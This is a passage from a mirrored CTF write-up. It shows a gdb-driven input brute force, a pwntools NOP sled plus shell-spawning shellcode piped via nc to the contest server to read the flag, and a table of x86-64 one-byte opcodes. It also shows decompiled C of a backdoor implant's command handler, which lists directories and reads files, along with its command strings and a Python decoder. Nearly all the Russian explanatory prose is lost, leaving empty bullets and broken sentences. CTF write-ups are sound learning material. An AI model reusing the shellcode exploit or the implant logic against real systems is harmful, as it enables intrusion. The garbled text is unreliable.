class="hljs-string"><span class="hljs-string">'set pagination off \n break *0x4009ae \n run &lt; input \n si \nx/8xb $pc \n'</span></span> | gdb ./m1 | sed -e <span class="hljs-string"><span class="hljs-string">'s/(gdb) //; s/\t/ /g'</span></span> | grep <span class="hljs-string"><span class="hljs-string">'^0x[a-f0-9]\+:'</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">done</span></span> 1105019561413684439260 0x7fffffffe588: 0xf1 0x9d 0xd2 0x89 0x54 0xeb 0x05 0x00 ... 1105016229177322000000 0x7fffffffe588: 0x52 0x58 0x5a 0x5e 0x53 0xeb 0x05 0x00</code> </pre> <br><p>   : </p><br><pre> <code class="bash hljs">user@ctf:~$ <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">'331615\n1105016229177322000000.0\n'</span></span> &gt; input user@ctf:~$ python -c <span class="hljs-string"><span class="hljs-string">'from pwn import *; context.arch = "x86_64"; print asm("nop") * 200 + asm(shellcraft.amd64.linux.sh())'</span></span> &gt; payload user@ctf:~$ (cat input; sleep 1; cat payload; sleep 1; <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> ls) | nc spbctf.ppctf.net 5353 flag.txt m116 run.sh run_image.sh runserver.sh ^C user@ctf:~$ (cat input; sleep 1; cat payload; sleep 1; <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> cat flag.txt) | nc spbctf.ppctf.net 5353 H0P3_U_3Nj0Y3D_OU12_OBFUSKATOR</code> </pre> <br><div class="spoiler"> <b class="spoiler_title">    x86-64</b> <div class="spoiler_text"><pre> <code class="html hljs xml">&gt;&gt;&gt; for c in (c for c in (disasm(chr(i)) for i in range(256)) if '.byte' not in c and '(bad)' not in c): print c 0: 0: 26 es 0: 2e cs 0: 36 ss 0: 3e ds 0: 40 rex 0: 41 rex.B 0: 42 rex.X 0: 43 rex.XB 0: 44 rex.R 0: 45 rex.RB 0: 46 rex.RX 0: 47 rex.RXB 0: 48 rex.W 0: 49 rex.WB 0: 4a rex.WX 0: 4b rex.WXB 0: 4c rex.WR 0: 4d rex.WRB 0: 4e rex.WRX 0: 4f rex.WRXB 0: 50 push rax 0: 51 push rcx 0: 52 push rdx 0: 53 push rbx 0: 54 push rsp 0: 55 push rbp 0: 56 push rsi 0: 57 push rdi 0: 58 pop rax 0: 59 pop rcx 0: 5a pop rdx 0: 5b pop rbx 0: 5c pop rsp 0: 5d pop rbp 0: 5e pop rsi 0: 5f pop rdi 0: 64 fs 0: 65 gs 0: 66 data16 0: 67 addr32 0: 6c ins BYTE PTR es:[rdi],dx 0: 6d ins DWORD PTR es:[rdi],dx 0: 6e outs dx,BYTE PTR ds:[rsi] 0: 6f outs dx,DWORD PTR ds:[rsi] 0: 90 nop 0: 91 xchg ecx,eax 0: 92 xchg edx,eax 0: 93 xchg ebx,eax 0: 94 xchg esp,eax 0: 95 xchg ebp,eax 0: 96 xchg esi,eax 0: 97 xchg edi,eax 0: 98 cwde 0: 99 cdq 0: 9b fwait 0: 9c pushf 0: 9d popf 0: 9e sahf 0: 9f lahf 0: a4 movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi] 0: a5 movs DWORD PTR es:[rdi],DWORD PTR ds:[rsi] 0: a6 cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi] 0: a7 cmps DWORD PTR ds:[rsi],DWORD PTR es:[rdi] 0: aa stos BYTE PTR es:[rdi],al 0: ab stos DWORD PTR es:[rdi],eax 0: ac lods al,BYTE PTR ds:[rsi] 0: ad lods eax,DWORD PTR ds:[rsi] 0: ae scas al,BYTE PTR es:[rdi] 0: af scas eax,DWORD PTR es:[rdi] 0: c3 ret 0: c9 leave 0: cb retf 0: cc int3 0: cf iret 0: d7 xlat BYTE PTR ds:[rbx] 0: ec in al,dx 0: ed in eax,dx 0: ee out dx,al 0: ef out dx,eax 0: f0 lock 0: f1 icebp 0: f2 repnz 0: f3 repz 0: f4 hlt 0: f5 cmc 0: f8 clc 0: f9 stc 0: fa cli 0: fb sti 0: fc cld 0: fd std</code> </pre> </div></div></div></div><br><hr><br><h1> Day 7. Hacking chains </h1><br><p>       : Web  RE (  SchoolCTF).        .       - ,         .    xss    ,       malware   .  200       . </p><br><table><tbody><tr><td colspan="3" align="center">  Winners </td></tr><tr><td align="center"> <b>1 </b> </td><td align="center"> <b>2 </b> </td><td align="center"> <b>3 </b> </td></tr><tr><td align="center"><pre> <code class="html hljs xml">ilyaluk</code> </pre> </td><td align="center"><pre> <code class="html hljs xml">smalukav</code> </pre> </td><td align="center"><pre> <code class="html hljs xml">Felis-Sapiens</code> </pre> </td></tr></tbody></table><br><div class="spoiler"> <b class="spoiler_title">7th day writeup. (by ilyaluk)</b> <div class="spoiler_text"><blockquote> If you are seeing this text you've got to be a highly experienced security professional. <br><br> Recently our IDS system has detected some weird user behavior in one of our corporate accounts. During an investigation we've found an incoming connection to a non-standard TCP port. We've been able to track source IP that led us to malware.zn.school-ctf.org. The website seems to be abandoned and we couldn't find anything which would help us to trace a real source of an intial connection or to contact the website owners. <br><br> We are suspecting that the machine is infected with some implants, but couldn't find any proofs of that either. We are asking you to continue the investigation, but we cannot give you an access to an internal network. You must find a shop owners and take control over implants in our network (if there are any). <br><br> We've already isolated possibly infected machine so you can find files that will proof presence of implants. <br><br> Yours, <br> VDooli Inc. </blockquote><br><ul><li>     malware.zn.school-ctf.org.    , XSS   . </li></ul><br><p><img src="https://habrastorage.org/getpro/habr/post_images/7e7/842/ed3/7e7842ed3c24b23618ea4d8f1fe5945f.png"></p><br><ul><li>     ,        . </li></ul><br><p><img src="https://habrastorage.org/getpro/habr/post_images/6f8/a06/aa2/6f8a06aa239ac94c459f91a023b54464.png"></p><br><ul><li>         : <br><ul><li> <a href="">http://sibears.ru/files/drop.zip</a> </li><li> vdooli.zn.school-ctf.org </li></ul></li><li>   ELF x86-64 . ,          48807.          -  . </li><li>    IDA, ,   .  <code>main</code>   : </li></ul><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">void</span></span> __fastcall __<span class="hljs-function"><span class="hljs-function">noreturn </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(__int64 argc, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> **argv, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> **env)</span></span></span><span class="hljs-function"> </span></span>{ agree(); clear_argv((<span class="hljs-keyword"><span class="hljs-keyword">const</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> **)argv); myfork(); nop(); sub_4012E8((__int64)&amp;unk_611030); setup_socket(); }</code> </pre> <br><ul><li> <code>agree</code> ‚Äî   <code>AGREE</code>   </li><li> <code>clear_argv</code> ‚Äî  <code>argv[0]</code> </li><li> <code>myfork</code> ‚Äî  </li><li> <code>sub_4012E8</code> ‚Äî  -    </li><li> <code>setup_socket</code> ‚Äî        </li></ul><br><p>   <code>setup_socket</code>    . </p><br><div class="spoiler"> <b class="spoiler_title">   </b> <div class="spoiler_text"><pre> <code class="cpp hljs">__int64 __<span class="hljs-function"><span class="hljs-function">fastcall </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">handle_sock</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> fd)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-comment"><span class="hljs-comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND] v30 = *MK_FP(__FS__, 40LL); v1 = time(0LL); srand(v1); buf = rand() % 998 + 1; write(fd, &amp;buf, 4uLL); v24 = 127; v25 = &amp;v28; v10 = len_read(fd, (__int64)&amp;v24, 0x7Fu); if ( v10 ) { v14 = malloc(0x1000uLL); v15 = malloc(0x1000uLL); ptr = malloc(0x1000uLL); v17 = malloc(0x1000uLL); if ( v14 &amp;&amp; v15 &amp;&amp; ptr &amp;&amp; v17 ) { ascii_to_utf16(v14, (__int64)&amp;v24); v18 = sub_401143((__int64)&amp;unk_611030, 7); do { sub_4024CE(); v19 = v2; } while ( v2 != 2 ); nptr = &amp;v29; utf16_to_ascii((signed int *)v14, (__int64)&amp;v26); v11 = strtol(nptr, 0LL, 10); if ( v11 == buf ) { write(fd, "maladca", 7uLL); v10 = len_read(fd, (__int64)&amp;v24, 0x7Fu); if ( v10 ) { ascii_to_utf16(v14, (__int64)&amp;v24); decrypt((__int64)v14, (__int64)v15); v12 = space_index((char *)v14); if ( v12 != -1 ) { v10 = substr((char *)v14, (__int64)ptr, 0, v12); if ( v10 != -1 ) { v10 = substr((char *)v14, (__int64)v17, v12 + 2, -1); if ( v10 != -1 ) { v3 = command_to_idx((__int64)ptr, (__int64)v15); v13 = v3; switch ( v3 ) { case 2: utf16_to_ascii((signed int *)v17, (__int64)&amp;v26); v20 = nptr; nptr[v26] = 0; v4 = (unsigned __int64)list_dir(nptr); s = (char *)v4; if ( v4 ) { v26 = strlen(s); nptr = s; for ( i = 0; v26 &gt; i; ++i ) ++s[i]; len_write(fd, (__int64)&amp;v26); free(s); } break; case 3: utf16_to_ascii((signed int *)v17, (__int64)&amp;v26); v20 = nptr; nptr[v26] = 0; v5 = (unsigned __int64)cat_file(nptr); v22 = v5; if ( v5 ) { v23 = *(_QWORD *)(v22 + 8); for ( j = 0; *(_DWORD *)v22 &gt; j; ++j ) ++*(_BYTE *)((signed int)j + v23); len_write(fd, v22); sub_4026E0(v22); } break; case 1: sub_4015CB(v14, "hello hello my friend!"); sub_40127B((__int64)v14, (__int64)v15); utf16_to_ascii((signed int *)v14, (__int64)&amp;v26); len_write(fd, (__int64)&amp;v26); break; } } } } } } } if ( ptr ) free(ptr); if ( v17 ) free(v17); if ( v14 ) free(v14); if ( v15 ) free(v15); } return *MK_FP(__FS__, 40LL) ^ v30; }</span></span></code> </pre> </div></div><br><p>  What's going on here: </p><br><ul><li>         </li><li>      <code>length-value</code>  </li><li>   , ,  <code>strtol</code>       </li><li>  <code>maladca</code>   </li><li>      ,   <code>utf16</code> ,   -  ,    </li><li>       ,       : <br><ul><li> <code>hello</code> ‚Äî 1 </li><li> <code>jqi3ow0o3qw3</code> ‚Äî 2 </li><li> <code>t35j3r8o3h92</code> ‚Äî 3 </li></ul></li><li>       ,  2  3: <br><ul><li> 2 ‚Äî   ,    </li><li> 3 ‚Äî  ,    </li></ul></li><li>        </li><li>      <code>length-value</code>  </li></ul><br><p>    .  ,          <code>length-value</code>    <code>0x4010E6</code> ,        . </p><br><p>        ,       : </p><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dec</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(data)</span></span></span><span class="hljs-function">:</span></span> data = list(data) prefix = <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(len(data)): data[-i - <span class="hljs-number"><span class="hljs-number">1</span></span>] ^= prefix prefix = data[-i - <span class="hljs-number"><span class="hljs-number">1</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> bytes(data)</code> </pre> <br><p>          <code>flag.txt</code> . </p></div></div></div><p>Source: <a href="https://habr.com/ru/post/342224/">https://habr.com/ru/post/342224/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../342214/index.html">JSON error handling with Spring Boot</a></li>
<li><a href="../342216/index.html">How to break a bicycle over crutches when testing your distribution</a></li>
<li><a href="../342218/index.html">Learning Go by porting a small Python web backend</a></li>
<li><a href="../342220/index.html">Architecture of the collection service and classification of housing ads from Vkontakte</a></li>
<li><a href="../342222/index.html">The digest of fresh materials from the world of the frontend for the last week ‚Ññ288 (November 6 - 12, 2017)</a></li>
<li><a href="../342226/index.html">New features for monitoring Java applications in Zabbix 3.4</a></li>
<li><a href="../342228/index.html">The latest Windows Server version 1709 is available in the Azure Pack Infrastructure cloud from InfoboxCloud</a></li>
<li><a href="../342230/index.html">RedmineUP - platform for product teams</a></li>
<li><a href="../342232/index.html">Installation Kubernetes 1.8 Bare Metal</a></li>
<li><a href="../342234/index.html">Top 10 Test Automation Tools 2018</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>